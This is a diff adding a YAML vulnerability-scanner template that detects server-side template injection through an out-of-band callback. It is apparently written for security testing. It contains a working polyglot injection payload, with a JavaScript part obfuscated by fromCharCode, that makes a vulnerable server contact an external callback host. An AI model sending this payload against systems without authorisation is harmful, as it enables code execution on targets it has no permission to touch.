@@ -1,0 +1,81 @@
+id: ssti-polyglot-multi-engine-oob
+
+info:
+  name: Server-Side Template Injection - Polyglot Multi-Engine OOB Detection
+  author: geeknik
+  severity: high
+  description: |
+    Detects Server-Side Template Injection vulnerabilities across multiple template engines
+    using polyglot payloads with OOB confirmation for enhanced accuracy.
+  reference:
+    - https://portswigger.net/web-security/server-side-template-injection
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-94,CWE-95
+  tags: ssti,template-injection,oob,polyglot
+
+variables:
+  callback_url: "{{interactsh-url}}"
+  engine_id: "{{randstr}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/contact"
+
+    payloads:
+      param:
+        - "q"
+        - "search"
+        - "query"
+        - "name"
+        - "message"
+
+    raw:
+      - |
+        GET {{path}}?{{param}}={{url_encode("<%=7*7%>#{7*7}${7*7}[%7*7%]constructor.constructor(String.fromCharCode(108,111,99,97,116,105,111,110,61,34,104,116,116,112,58,47,47)+\"{{callback_url}}/ssti-{{engine_id}}\"+String.fromCharCode(34))()")}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/contact"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:
+        - "q"
+        - "query"
+        - "message"
+
+    body: "{{param}}={{url_encode(\"<%=7*7%>#{7*7}${7*7}[%7*7%]constructor.constructor(String.fromCharCode(108,111,99,97,116,105,111,110,61,34,104,116,116,112,58,47,47)+\\\"{{callback_url}}/ssti-{{engine_id}}\\\"+String.fromCharCode(34))()\"))}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "ssti-"
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/ssti-([a-z0-9]+)"
+        group: 1
